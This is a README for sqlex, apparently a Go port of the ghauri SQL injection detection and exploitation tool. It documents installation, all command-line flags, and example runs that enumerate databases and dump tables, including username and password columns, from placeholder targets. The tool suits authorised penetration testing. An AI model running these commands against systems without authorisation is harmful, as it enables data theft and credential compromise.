# sqlex

[![License: MIT](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
[![Go](https://img.shields.io/badge/go-1.21+-00ADD8?style=flat-square&logo=go)](https://golang.org)

Advanced SQL injection detection and exploitation tool — a full Go rewrite of [ghauri](https://github.com/r0oth3x49/ghauri), providing a single static binary with no runtime dependencies, true concurrency via goroutine pools, and identical feature parity.

## Features

- **Techniques**: boolean-based blind · error-based · time-based blind · stacked queries
- **DBMS**: MySQL · Microsoft SQL Server · PostgreSQL · Oracle · Microsoft Access
- **Extraction operators**: `>` (binary search) · `NOT BETWEEN` · `IN(…)` · `=` (linear)
- **Enumeration**: banner · current user · current DB · hostname · databases · tables · columns · full table dump (CSV)
- **Session resumption**: SQLite-backed per-target session under `~/.ghauri/<host>/<hash>/`
- **Concurrency**: goroutine pool (`--threads N`) for parallel character extraction
- **Injection points**: GET · POST · Cookie · HTTP headers · JSON body · XML body · multipart

## Installation

**One-liner** (requires Go 1.21+):

```sh
go install github.com/SobhanYasami/sqlex/cmd/sqlex@latest
```

**Specific version**:

```sh
go install github.com/SobhanYasami/sqlex/cmd/sqlex@v1.1.0
```

**From source**:

```sh
git clone https://github.com/SobhanYasami/sqlex.git
cd sqlex
go build -o sqlex ./cmd/sqlex/
```

## Quick Start

```sh
# Basic boolean-based detection
sqlex -u "http://target/page?id=1"

# Test POST parameter with error + boolean techniques
sqlex -u "http://target/login" -d "user=admin&pass=test" -t BE

# Force DBMS, enumerate databases
sqlex -u "http://target/page?id=1" --dbms MySQL --dbs

# Dump a specific table
sqlex -u "http://target/page?id=1" -D mydb -T users --dump

# Dump specific columns with row range
sqlex -u "http://target/page?id=1" -D mydb -T users -C "username,password" --start 1 --stop 50 --dump

# Load request from Burp file, use random User-Agent, 5 threads
sqlex -r request.txt --random-agent --threads 5 --dbs

# Resume a previous session (automatic — session is per-target URL hash)
sqlex -u "http://target/page?id=1" --dump   # continues where it left off

# Flush session and start fresh
sqlex -u "http://target/page?id=1" --flush-session --dbs
```

## All Flags

### Target

| Flag | Short | Description |
| ------ | ------- | ----------- |
| `--url` | `-u` | Target URL |
| `--data` | `-d` | POST body data |
| `--cookie` | | HTTP Cookie header |
| `--headers` | `-H` | Extra headers (newline-separated `Key: Value`) |
| `--proxy` | | HTTP proxy (`http://127.0.0.1:8080`) |
| `--request-file` | `-r` | Load raw HTTP request from file (Burp-style) |
| `--bulk-file` | `-m` | File of target URLs to scan one per line |

### Detection

| Flag | Short | Default | Description |
| ------ | ------- | --------- | ----------- |
| `--technique` | `-t` | `BT` | Techniques: `B`=boolean, `E`=error, `T`=time |
| `--dbms` | | | Force back-end DBMS |
| `--level` | | `1` | Test depth 1–5 |
| `--test-parameter` | | | Restrict to specific parameter name |
| `--prefix` | | | Payload prefix |
| `--suffix` | | | Payload suffix |
| `--string` | | | String present on true response |
| `--not-string` | | | String present on false response |
| `--code` | | | HTTP status code indicating true |
| `--text-only` | | | Compare text content only (ignore tags) |

### Request Tuning

| Flag | Default | Description |
| ------ | --------- | ----------- |
| `--delay` | `0` | Seconds between requests |
| `--timeout` | `30` | Connection timeout (seconds) |
| `--time-sec` | `5` | Sleep duration for time-based payloads |
| `--retries` | `3` | Retry count on timeout |
| `--threads` | `1` | Parallel extraction goroutines |
| `--skip-urlencode` | | Skip URL-encoding payloads |
| `--safe-chars` | | Characters to exclude from URL encoding |
| `--random-agent` | | Random User-Agent header |
| `--mobile` | | Mobile User-Agent |
| `--follow-redirect` | | `true`/`false` to override redirect behaviour |
| `--force-ssl` | | Force HTTPS |

### Optimisation

| Flag | Description |
| ------ | ----------- |
| `--fetch-using` | Force extraction operator: `greater` / `between` / `in` / `equal` |

### Session

| Flag | Description |
| ------ | ----------- |
| `--session-dir` | Override session directory path |
| `--flush-session` | Delete and recreate session for this target |
| `--fresh-queries` | Ignore cached extraction results, re-run queries |

### Enumeration

| Flag | Short | Description |
| ------ | ------- | ----------- |
| `--banner` | | Retrieve DBMS version banner |
| `--current-user` | | Current database user |
| `--current-db` | | Current database name |
| `--hostname` | | Database server hostname |
| `--dbs` | | List all databases |
| `--tables` | | List tables in `--db` |
| `--columns` | | List columns in `--db` / `--table` |
| `--dump` | | Dump rows from `--db` / `--table` |
| `--count` | | Row count only (no data) |
| `--db` | `-D` | Target database name |
| `--table` | `-T` | Target table name |
| `--col` | `-C` | Comma-separated column list |
| `--start` | | First row offset (1-based) |
| `--stop` | | Last row offset |

### Misc

| Flag | Short | Description |
| ------ | ------- | ----------- |
| `--batch` | `-b` | Non-interactive mode (accept defaults) |
| `--verbose` | `-v` | Verbosity 0–6 (default 1) |

## Examples

### Full recon in one pass

```sh
sqlex -u "http://target/item?id=5" \
  --banner --current-user --current-db --hostname \
  --dbs --random-agent -b
```

### Dump via Burp request file through proxy

```sh
sqlex -r /tmp/req.txt \
  --proxy http://127.0.0.1:8080 \
  -D shopdb -T orders --dump \
  --threads 4 --batch
```

### JSON POST body injection

```sh
sqlex -u "http://api.target/search" \
  -d '{"query":"test"}' \
  -H "Content-Type: application/json" \
  -t B --current-db
```

### Custom injection marker in cookie

```sh
sqlex -u "http://target/dashboard" \
  --cookie "session=abc123*; lang=en" \
  --dbs
```

Placing `*` in a parameter value forces sqlex to test that specific location.

### Time-based on a blind endpoint

```sh
sqlex -u "http://target/track?uid=1" \
  -t T --dbms MySQL \
  --time-sec 6 --retries 5 \
  --current-db
```

## Session Files

Sessions live at `~/.ghauri/<hostname>/<md5[:8]>/`:

```
~/.ghauri/
└── target.example.com/
    └── a3f2c1b0/
        ├── session.sqlite   # injection fingerprint + partial extraction cache
        └── dump/
            └── mydb/
                └── users.csv
```

Re-running the same URL + data combination automatically resumes from where extraction stopped. Use `--flush-session` to start over.

## Architecture

```
cmd/sqlex/         CLI entry point (cobra)
internal/
  config/           Config + RunState structs
  engine/           Orchestration: injection → enumeration
  detection/        BasicCheck, CheckInjections (boolean/error/time)
  dbms/             DBMS fingerprinting via boolean expression probes
  extract/          Character extraction: binary / between / in / linear search
  enumeration/      FetchBanner, FetchDBs, FetchTables, FetchColumns, DumpTable
  inject/           Parameter substitution → HTTP dispatch
  payloads/         Embedded payload JSON, render helpers, UA list
  request/          HTTP client + response type
  session/          SQLite WAL session (modernc.org/sqlite, pure Go)
  utils/            FilterHTML, SequenceRatio, CheckBooleanResponses, param parsing
```

## License

MIT — see [LICENSE](LICENSE).
